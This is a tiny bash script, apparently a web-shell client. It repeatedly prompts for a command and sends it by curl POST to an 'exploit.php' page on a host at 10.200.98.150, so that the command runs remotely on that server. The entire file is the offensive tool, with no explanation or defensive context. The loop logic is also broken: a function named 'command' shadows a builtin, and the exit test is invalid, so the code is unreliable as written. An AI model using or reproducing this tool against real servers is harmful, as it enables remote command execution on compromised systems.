#!/bin/bash

function command {
    read -p "What command would you like to run?: " command
}

while command -ne "exit"
do
    curl -X POST http://10.200.98.150//web/exploit.php -d "a=$command"
done